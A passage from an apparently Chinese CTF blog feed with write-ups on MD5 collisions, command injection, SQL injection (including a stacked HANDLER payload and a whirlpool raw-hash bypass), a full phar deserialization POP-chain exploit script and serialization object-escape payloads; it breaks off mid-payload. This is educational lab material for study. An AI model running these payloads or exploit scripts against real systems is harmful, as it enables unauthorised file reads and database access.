#同理<span class="hljs-attribute">D</span>:\fastcoll&gt;type jlzj<span class="hljs-number">0</span> a &gt; jlzj<span class="hljs-number">10</span>                    #这里表示将jlzj<span class="hljs-number">0</span>和a文件的内容合并写入jlzj<span class="hljs-number">10</span><span class="hljs-attribute">D</span>:\fastcoll&gt;type jlzj<span class="hljs-number">0</span> b &gt; jlzj<span class="hljs-number">11</span>                    #同理写入jlzj<span class="hljs-number">11</span></code></pre></li><li><p>验证MD5</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span>  <span class="hljs-title">readmyfile</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span>&#123;    <span class="hljs-variable">$fh</span> = fopen(<span class="hljs-variable">$path</span>, <span class="hljs-string">&quot;rb&quot;</span>);    <span class="hljs-variable">$data</span> = fread(<span class="hljs-variable">$fh</span>, filesize(<span class="hljs-variable">$path</span>));    fclose(<span class="hljs-variable">$fh</span>);    <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;&#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;二进制hash &#x27;</span>. md5( (readmyfile(<span class="hljs-string">&quot;01&quot;</span>)));<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;br&gt;\r\n&quot;</span>;<span class="hljs-keyword">echo</span>  <span class="hljs-string">&#x27;URLENCODE &#x27;</span>. urlencode(readmyfile(<span class="hljs-string">&quot;01&quot;</span>));<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;br&gt;\r\n&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;URLENCODE hash &#x27;</span>.md5(urlencode (readmyfile(<span class="hljs-string">&quot;01&quot;</span>)));<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;br&gt;\r\n&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;二进制hash &#x27;</span>.md5( (readmyfile(<span class="hljs-string">&quot;00&quot;</span>)));<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;br&gt;\r\n&quot;</span>;<span class="hljs-keyword">echo</span>  <span class="hljs-string">&#x27;URLENCODE &#x27;</span>.  urlencode(readmyfile(<span class="hljs-string">&quot;00&quot;</span>));<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;br&gt;\r\n&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;URLENCODE hash &#x27;</span>.md5( urlencode(readmyfile(<span class="hljs-string">&quot;00&quot;</span>)));<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;br&gt;\r\n&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;二进制hash &#x27;</span>.md5( (readmyfile(<span class="hljs-string">&quot;11&quot;</span>)));<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;br&gt;\r\n&quot;</span>;<span class="hljs-keyword">echo</span>  <span class="hljs-string">&#x27;URLENCODE &#x27;</span>.  urlencode(readmyfile(<span class="hljs-string">&quot;11&quot;</span>));<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;br&gt;\r\n&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;URLENCODE hash &#x27;</span>.md5( urlencode(readmyfile(<span class="hljs-string">&quot;11&quot;</span>)));<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;br&gt;\r\n&quot;</span>;<span class="hljs-comment">############输出##############输出#########输出#####################</span>二进制hash dad508c9b28f6d659f88215b593345ac&lt;br&gt;&lt;br&gt;URLENCODE %<span class="hljs-number">93</span>%FB%<span class="hljs-number">29</span>%<span class="hljs-number">80</span>Xv%B4X%AE%A4%<span class="hljs-number">13</span>i%<span class="hljs-number">1</span>FZj%CA%<span class="hljs-number">8</span>D%<span class="hljs-number">91</span>%<span class="hljs-number">9</span>B_%<span class="hljs-number">22</span>s+%AB%<span class="hljs-number">22</span>%<span class="hljs-number">1</span>A%<span class="hljs-number">40</span>%C6J%<span class="hljs-number">3</span>A%C5%DE%<span class="hljs-number">9</span>F%<span class="hljs-number">0</span>C%D4%CB%CC%<span class="hljs-number">83</span>%<span class="hljs-number">0</span>A%F4oB%C0d%DA%<span class="hljs-number">85</span>%<span class="hljs-number">09</span>cMKt%<span class="hljs-number">8</span>C%<span class="hljs-number">82</span>%<span class="hljs-number">95</span>%FE%A71%<span class="hljs-number">5</span>C%D2JW%<span class="hljs-number">0</span>EN%F4%<span class="hljs-number">97</span>%CD%C1%D0%B3%<span class="hljs-number">08</span>u%<span class="hljs-number">16</span>%<span class="hljs-number">1</span>D%<span class="hljs-number">7</span>E%<span class="hljs-number">96</span>%B1%<span class="hljs-number">3</span>D%FBF%<span class="hljs-number">8</span>AD%A8T%E5%<span class="hljs-number">12</span>x%<span class="hljs-number">00</span>a%CD%<span class="hljs-number">97</span>%F2%C4%D9%<span class="hljs-number">21</span>Y%AE%B7H%<span class="hljs-number">9</span>E%FE%<span class="hljs-number">3</span>E%<span class="hljs-number">1</span>C%<span class="hljs-number">9</span>F%<span class="hljs-number">26</span>%<span class="hljs-number">93</span>%A5%BD%EF%B4%<span class="hljs-number">22</span>d%A8%AD%C4%<span class="hljs-number">02</span>%<span class="hljs-number">94</span>%<span class="hljs-number">10</span>Oh%<span class="hljs-number">2</span>Bz%E1%F4%E0%AE%<span class="hljs-number">9</span>BY%<span class="hljs-number">8</span>B%<span class="hljs-number">29</span>%DAvv%F3_%D9%<span class="hljs-number">3</span>C7%<span class="hljs-number">40</span>sl%<span class="hljs-number">5</span>B%<span class="hljs-number">08</span>%EA%EF%A7%F7%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>C%<span class="hljs-number">82</span>%<span class="hljs-number">3</span>F%<span class="hljs-number">907</span>%<span class="hljs-number">40</span>r%<span class="hljs-number">82</span>%FEj%A8%A5%<span class="hljs-number">18</span>q%C5%C7%E6%<span class="hljs-number">5</span>E%<span class="hljs-number">0</span>C%F6%<span class="hljs-number">7</span>C%EB%<span class="hljs-number">29</span>%EB%<span class="hljs-number">24</span>%B4%<span class="hljs-number">07</span>%<span class="hljs-number">1</span>D%<span class="hljs-number">3</span>F%<span class="hljs-number">00</span>%E0%F4%<span class="hljs-number">0</span>A%A6%A2%B4%<span class="hljs-number">1</span>B%D9%E80%<span class="hljs-number">19</span>%<span class="hljs-number">10</span>I%F9%FC%<span class="hljs-number">0</span>AyP%DFK%FEL%F22%E9%E2%B4R%<span class="hljs-number">1</span>EY%CC%BB4%<span class="hljs-number">26</span>%<span class="hljs-number">84</span>%<span class="hljs-number">0</span>A%DB%<span class="hljs-number">08</span>%BAn%<span class="hljs-number">99</span>%<span class="hljs-number">93</span>%<span class="hljs-number">5</span>BKLOA%<span class="hljs-number">5</span>C%E4%C0n%<span class="hljs-number">86</span>%A8%<span class="hljs-number">82</span>%<span class="hljs-number">3</span>F%<span class="hljs-number">9</span>D%<span class="hljs-number">93</span>%EB%B8%<span class="hljs-number">9</span>B%<span class="hljs-number">88</span>%E0%<span class="hljs-number">3</span>C%<span class="hljs-number">2</span>A%D1%E4%<span class="hljs-number">84</span>%<span class="hljs-number">1</span>A%AF%<span class="hljs-number">7</span>FB%<span class="hljs-number">2</span>C%<span class="hljs-number">0</span>D%A6%DDS%<span class="hljs-number">882</span>%<span class="hljs-number">25</span>&lt;br&gt;&lt;br&gt;URLENCODE hash <span class="hljs-number">00</span>bef5c29b41728f7e2049e748926781&lt;br&gt;&lt;br&gt;二进制hash dad508c9b28f6d659f88215b593345ac&lt;br&gt;&lt;br&gt;URLENCODE %<span class="hljs-number">93</span>%FB%<span class="hljs-number">29</span>%<span class="hljs-number">80</span>Xv%B4X%AE%A4%<span class="hljs-number">13</span>i%<span class="hljs-number">1</span>FZj%CA%<span class="hljs-number">8</span>D%<span class="hljs-number">91</span>%<span class="hljs-number">9</span>B_%<span class="hljs-number">22</span>s+%AB%<span class="hljs-number">22</span>%<span class="hljs-number">1</span>A%<span class="hljs-number">40</span>%C6J%<span class="hljs-number">3</span>A%C5%DE%<span class="hljs-number">9</span>F%<span class="hljs-number">0</span>C%D4%CB%CC%<span class="hljs-number">83</span>%<span class="hljs-number">0</span>A%F4oB%C0d%DA%<span class="hljs-number">85</span>%<span class="hljs-number">09</span>cMKt%<span class="hljs-number">8</span>C%<span class="hljs-number">82</span>%<span class="hljs-number">95</span>%FE%A71%<span class="hljs-number">5</span>C%D2JW%<span class="hljs-number">0</span>EN%F4%<span class="hljs-number">97</span>%CD%C1%D0%B3%<span class="hljs-number">08</span>u%<span class="hljs-number">16</span>%<span class="hljs-number">1</span>D%<span class="hljs-number">7</span>E%<span class="hljs-number">96</span>%B1%<span class="hljs-number">3</span>D%FBF%<span class="hljs-number">8</span>AD%A8T%E5%<span class="hljs-number">12</span>x%<span class="hljs-number">00</span>a%CD%<span class="hljs-number">97</span>%F2%C4%D9%<span class="hljs-number">21</span>Y%AE%B7H%<span class="hljs-number">9</span>E%FE%<span class="hljs-number">3</span>E%<span class="hljs-number">1</span>C%<span class="hljs-number">9</span>F%<span class="hljs-number">26</span>%<span class="hljs-number">93</span>%A5%BD%EF%B4%<span class="hljs-number">22</span>d%A8%AD%C4%<span class="hljs-number">02</span>%<span class="hljs-number">94</span>%<span class="hljs-number">10</span>Oh%<span class="hljs-number">2</span>Bz%E1%F4%E0%AE%<span class="hljs-number">9</span>BY%<span class="hljs-number">8</span>B%<span class="hljs-number">29</span>%DAvv%F3_%D9%<span class="hljs-number">3</span>C7%<span class="hljs-number">40</span>sl%<span class="hljs-number">5</span>B%<span class="hljs-number">08</span>%EA%EF%A7%F7%<span class="hljs-number">9</span>E%<span class="hljs-number">1</span>C%<span class="hljs-number">82</span>%<span class="hljs-number">3</span>F%<span class="hljs-number">907</span>%<span class="hljs-number">40</span>r%<span class="hljs-number">82</span>%FEj%A8%A5%<span class="hljs-number">18</span>q%C5%C7%E6%<span class="hljs-number">5</span>E%<span class="hljs-number">0</span>C%F6%<span class="hljs-number">7</span>C%EB%<span class="hljs-number">29</span>%EB%<span class="hljs-number">24</span>%B4%<span class="hljs-number">87</span>%<span class="hljs-number">1</span>C%<span class="hljs-number">3</span>F%<span class="hljs-number">00</span>%E0%F4%<span class="hljs-number">0</span>A%A6%A2%B4%<span class="hljs-number">1</span>B%D9%E80%<span class="hljs-number">99</span>%<span class="hljs-number">10</span>I%F9%FC%<span class="hljs-number">0</span>AyP%DFK%FEL%F22%E9%E2%B4R%<span class="hljs-number">1</span>EY%CC%BB4%<span class="hljs-number">26</span>%<span class="hljs-number">04</span>%<span class="hljs-number">0</span>A%DB%<span class="hljs-number">08</span>%BAn%<span class="hljs-number">99</span>%<span class="hljs-number">93</span>%<span class="hljs-number">5</span>BKLOA%<span class="hljs-number">5</span>C%E4%C0n%<span class="hljs-number">86</span>%A8%<span class="hljs-number">82</span>%<span class="hljs-number">3</span>F%<span class="hljs-number">9</span>D%<span class="hljs-number">93</span>%EB%B8%<span class="hljs-number">9</span>B%<span class="hljs-number">08</span>%E1%<span class="hljs-number">3</span>C%<span class="hljs-number">2</span>A%D1%E4%<span class="hljs-number">84</span>%<span class="hljs-number">1</span>A%AF%<span class="hljs-number">7</span>FB%<span class="hljs-number">2</span>C%<span class="hljs-number">0</span>D%A6%<span class="hljs-number">5</span>DS%<span class="hljs-number">882</span>%<span class="hljs-number">25</span>&lt;br&gt;&lt;br&gt;URLENCODE hash c67701ddfec51469c8c0e81a212c047c&lt;br&gt;&lt;br&gt;二进制hash dad508c9b28f6d659f88215b593345ac&lt;br&gt;&lt;br&gt;URLENCODE %<span class="hljs-number">93</span>%FB%<span class="hljs-number">29</span>%<span class="hljs-number">80</span>Xv%B4X%AE%A4%<span class="hljs-number">13</span>i%<span class="hljs-number">1</span>FZj%CA%<span class="hljs-number">8</span>D%<span class="hljs-number">91</span>%<span class="hljs-number">9</span>B%DF%<span class="hljs-number">22</span>s+%AB%<span class="hljs-number">22</span>%<span class="hljs-number">1</span>A%<span class="hljs-number">40</span>%C6J%<span class="hljs-number">3</span>A%C5%DE%<span class="hljs-number">9</span>F%<span class="hljs-number">0</span>C%D4%CB%CC%<span class="hljs-number">83</span>%<span class="hljs-number">0</span>A%F4oB%C0d%DA%<span class="hljs-number">05</span>%<span class="hljs-number">09</span>cMKt%<span class="hljs-number">8</span>C%<span class="hljs-number">82</span>%<span class="hljs-number">95</span>%FE%A71%<span class="hljs-number">5</span>C%D2%CAW%<span class="hljs-number">0</span>EN%F4%<span class="hljs-number">97</span>%CD%C1%D0%B3%<span class="hljs-number">08</span>u%<span class="hljs-number">16</span>%<span class="hljs-number">1</span>D%<span class="hljs-number">7</span>E%<span class="hljs-number">96</span>%B1%<span class="hljs-number">3</span>D%FBF%<span class="hljs-number">8</span>AD%A8Te%<span class="hljs-number">12</span>x%<span class="hljs-number">00</span>a%CD%<span class="hljs-number">97</span>%F2%C4%D9%<span class="hljs-number">21</span>Y%AE%B7H%<span class="hljs-number">9</span>E%FE%<span class="hljs-number">3</span>E%<span class="hljs-number">1</span>C%<span class="hljs-number">9</span>F%<span class="hljs-number">26</span>%<span class="hljs-number">93</span>%A5%BD%EF%B4%A2d%A8%AD%C4%<span class="hljs-number">02</span>%<span class="hljs-number">94</span>%<span class="hljs-number">10</span>Oh%<span class="hljs-number">2</span>Bz%E1%F4%<span class="hljs-number">60</span>%AE%<span class="hljs-number">9</span>BY%<span class="hljs-number">8</span>B%<span class="hljs-number">29</span>%DAvv%F3_%D9%<span class="hljs-number">3</span>C7%<span class="hljs-number">40</span>sl%<span class="hljs-number">5</span>B%<span class="hljs-number">08</span>%EA%EF%A7%F7%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>C%<span class="hljs-number">82</span>%<span class="hljs-number">3</span>F%<span class="hljs-number">907</span>%<span class="hljs-number">40</span>r%<span class="hljs-number">82</span>%FEj%A8%A5%<span class="hljs-number">18</span>q%C5%C7%E6%<span class="hljs-number">5</span>E%<span class="hljs-number">0</span>C%F6%<span class="hljs-number">7</span>C%EB%<span class="hljs-number">29</span>%EB%<span class="hljs-number">24</span>%B4%<span class="hljs-number">07</span>%<span class="hljs-number">1</span>D%<span class="hljs-number">3</span>F%<span class="hljs-number">00</span>%E0%F4%<span class="hljs-number">0</span>A%A6%A2%B4%<span class="hljs-number">1</span>B%D9%E80%<span class="hljs-number">19</span>%<span class="hljs-number">10</span>I%F9%FC%<span class="hljs-number">0</span>AyP%DFK%FEL%F22%E9%E2%B4R%<span class="hljs-number">1</span>EY%CC%BB4%<span class="hljs-number">26</span>%<span class="hljs-number">84</span>%<span class="hljs-number">0</span>A%DB%<span class="hljs-number">08</span>%BAn%<span class="hljs-number">99</span>%<span class="hljs-number">93</span>%<span class="hljs-number">5</span>BKLOA%<span class="hljs-number">5</span>C%E4%C0n%<span class="hljs-number">86</span>%A8%<span class="hljs-number">82</span>%<span class="hljs-number">3</span>F%<span class="hljs-number">9</span>D%<span class="hljs-number">93</span>%EB%B8%<span class="hljs-number">9</span>B%<span class="hljs-number">88</span>%E0%<span class="hljs-number">3</span>C%<span class="hljs-number">2</span>A%D1%E4%<span class="hljs-number">84</span>%<span class="hljs-number">1</span>A%AF%<span class="hljs-number">7</span>FB%<span class="hljs-number">2</span>C%<span class="hljs-number">0</span>D%A6%DDS%<span class="hljs-number">882</span>%<span class="hljs-number">25</span>&lt;br&gt;&lt;br&gt;URLENCODE hash <span class="hljs-number">09</span>efc799c82ce1eb2678ac9689fa0d17&lt;br&gt;&lt;br&gt;</code></pre><p>二进制hash都相等</p><p>参考链接： <a href="https://xz.aliyun.com/t/3161#toc-5">https://xz.aliyun.com/t/3161#toc-5</a></p><p>​                    <a href="https://xz.aliyun.com/t/2232#toc-2">https://xz.aliyun.com/t/2232#toc-2</a></p></li></ul><ul><li>9，8 的话可以构造a、b使9，80e开头即可，需要注意的是弱相等 0e后面的字符串要全等于数字才行</li></ul><h2 id="commix"><a href="#commix" class="headerlink" title="commix"></a>commix</h2><p>payload: more `ls`</p><p>代替 cat 的命令还有  <a href="https://blog.csdn.net/x7418520/article/details/81064861">https://blog.csdn.net/x7418520/article/details/81064861</a></p><p>命令注入绕过总结在另一篇文章里。</p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><pre><code class="hljs php"><span class="hljs-comment"># 源码</span><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$ps</span> = mysql_real_escape_string(<span class="hljs-variable">$ps</span>);<span class="hljs-variable">$ps</span> = hash(<span class="hljs-string">&quot;whirlpool&quot;</span>,<span class="hljs-variable">$ps</span>, <span class="hljs-literal">true</span>);<span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-string">&quot;select * from users where user_id=&#x27;<span class="hljs-subst">$id</span>&#x27; and user_ps=&#x27;<span class="hljs-subst">$ps</span>&#x27;&quot;</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>hash(“whirlpool”,$ps, true)，关注到hash函数选为true时使得hash函数返回的是二进制串。任何字符都可能出现在字符串内。如果<code>&#39;=&#39;</code>出现在hash后的字符串内可能导致注入。</p><p><code>where user_ps=&#39;XXXX&#39;=&#39;YYY&#39;</code></p><p>先会执行<code>user_ps=&#39;XXXX&#39;</code>,应该为0，因为不相等，当YYY为字符串，字符串转化为int  0，所以整个判断式为真。</p><pre><code class="hljs apache"><span class="hljs-attribute">payload</span>: admin/<span class="hljs-number">364383</span></code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>比赛的时候第三题挂了，所以整个比赛一题没做出来，tcl，知识面太狭隘了。都是按照大师傅的writeup怼出来的 Qvq.</p><p><a href="https://www.gem-love.com/ctf/1799.html">https://www.gem-love.com/ctf/1799.html</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>命令注入绕过</tag>
      
      <tag>MD5碰撞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[GYCTF2020]Blacklist</title>
    <link href="/2020/02/22/GYCTF2020-Blacklist/"/>
    <url>/2020/02/22/GYCTF2020-Blacklist/</url>
    
    <content type="html"><![CDATA[<p><code>payload:1&#39;;handler FlagHere open;handler FlagHere read first;#</code></p><p>挖坑 </p><p>参考链接：</p><p><a href="https://xz.aliyun.com/t/7169#toc-47">https://xz.aliyun.com/t/7169#toc-47</a></p><p>ezsqli 挖坑</p><p>链接： </p><p><a href="https://www.smi1e.top/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E7%9B%8A%E8%B5%9B-ezsqli-%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/">https://www.smi1e.top/新春战疫公益赛-ezsqli-出题小记/</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>GYCTF2019</tag>
      
      <tag>sql注入</tag>
      
      <tag>handler语句代替select查询</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>代码审计 DAY1</title>
    <link href="/2020/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-DAY1/"/>
    <url>/2020/02/19/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-DAY1/</url>
    
    <content type="html"><![CDATA[<h1 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h1><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">#代码精简一下</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">return</span> file_get_contents(<span class="hljs-keyword">$this</span>-&gt;filename);    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$db</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;db-&gt;close();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>&#123;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span>;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$results</span>;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$funcs</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;        array_push(<span class="hljs-keyword">$this</span>-&gt;funcs, <span class="hljs-variable">$func</span>);        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;files <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;            <span class="hljs-keyword">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;name()][<span class="hljs-variable">$func</span>] = <span class="hljs-variable">$file</span>-&gt;<span class="hljs-variable">$func</span>();        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;funcs <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities(<span class="hljs-variable">$func</span>) . <span class="hljs-string">&#x27;&lt;/th&gt;&#x27;</span>;        &#125;        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;        <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;results <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span> =&gt; <span class="hljs-variable">$result</span>) &#123;            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;tr&gt;&#x27;</span>;            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$result</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span> =&gt; <span class="hljs-variable">$value</span>) &#123;                <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities(<span class="hljs-variable">$value</span>) . <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;            &#125;            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/tr&gt;&#x27;</span>;        &#125;        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$table</span>;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>​        FileList类里的__destruct方法会打印出文件内容，close获取内容，构造pop链读取flag。构造User类$a，里的db设置为FileList类，filename数组里加上flag.txt。(嗯，看大佬博客应该是这样的</p><p>​        把生成的$a写到phar里面去，结合phar反序列化的内容，成了。</p><p><strong>exp</strong>：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$db</span>;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span> </span>&#123;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span>;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$results</span>;    <span class="hljs-keyword">private</span> <span class="hljs-variable">$funcs</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> File();        <span class="hljs-variable">$file</span>-&gt;filename = <span class="hljs-string">&#x27;/flag.txt&#x27;</span>;        <span class="hljs-keyword">$this</span>-&gt;files = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$file</span>);        <span class="hljs-keyword">$this</span>-&gt;results = <span class="hljs-keyword">array</span>();        <span class="hljs-keyword">$this</span>-&gt;funcs = <span class="hljs-keyword">array</span>();    &#125;&#125;@unlink(<span class="hljs-string">&quot;phar.phar&quot;</span>);<span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//后缀名必须为phar</span><span class="hljs-variable">$phar</span>-&gt;startBuffering();<span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> User();<span class="hljs-variable">$a</span>-&gt;db=<span class="hljs-keyword">new</span> File();<span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$a</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&quot;exp.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><span class="hljs-comment">//签名自动计算</span><span class="hljs-variable">$phar</span>-&gt;stopBuffering();<span class="hljs-meta">?&gt;</span></code></pre><p><img src="https://s2.ax1x.com/2020/02/23/33JYJe.png" alt="33JYJe.png"></p><hr><p>生成的phar：</p><p><img src="https://s2.ax1x.com/2020/02/23/33JLl9.png" alt="33JLl9.png"></p><p>​        从payload看整个过程，unlink处理phar包实现反序列化，当$a销毁时调动User里面的__destruct()方法，db-&gt;close(),db是FileLists类，没有close(),调动 __call()跳转到File里的close读文件并返回结果，当db销毁，__destruct()调动，返回获取的文件内容！</p><h1 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h1><p><a href="https://www.cnblogs.com/kevinbruce656/p/11316070.html">https://www.cnblogs.com/kevinbruce656/p/11316070.html</a></p><p><a href="https://xz.aliyun.com/t/2715">https://xz.aliyun.com/t/2715</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pop链构造</tag>
      
      <tag>CISCN2019</tag>
      
      <tag>phar反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反序列化中的对象逃逸</title>
    <link href="/2020/02/15/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%9A%84%E5%AF%B9%E8%B1%A1%E9%80%83%E9%80%B8/"/>
    <url>/2020/02/15/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%9A%84%E5%AF%B9%E8%B1%A1%E9%80%83%E9%80%B8/</url>
    
    <content type="html"><![CDATA[<blockquote><p>做了两个题目，学习了下反序列化，php的</p><p>[0CTF 2016]piapiapia&amp;[安洵杯 2019]easy_serialize_php</p></blockquote><h1 id="反序列化中的对象逃逸"><a href="#反序列化中的对象逃逸" class="headerlink" title="反序列化中的对象逃逸"></a>反序列化中的对象逃逸</h1><ol><li><p>关键字增加</p><p>条件：[0CTF 2016]piapiapia 中 将where等关键词过滤变为<code>hacker</code>，字符增加</p><p>​    可以构造类似 <code>payload=where...where&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>。替换时将<code>s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>挤到正常的序列中并且闭合序列，也就是代替下一个值，使下一个值失效。</p><pre><code class="hljs d">nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="hljs-string">&quot;;&#125;s:5:&quot;</span>photo<span class="hljs-string">&quot;;s:10:&quot;c</span>onfig.php<span class="hljs-string">&quot;;&#125;</span><span class="hljs-string"></span><span class="hljs-string">序列化后的结果：</span><span class="hljs-string">$profile = a:4:&#123;s:5:&quot;</span>phone=<span class="hljs-string">&quot;;s:11:&quot;</span><span class="hljs-number">12345678901</span><span class="hljs-string">&quot;;s:5:&quot;</span>email<span class="hljs-string">&quot;;s:8:&quot;</span>ss<span class="hljs-keyword">@q</span>.com<span class="hljs-string">&quot;;s:8:&quot;</span>nickname<span 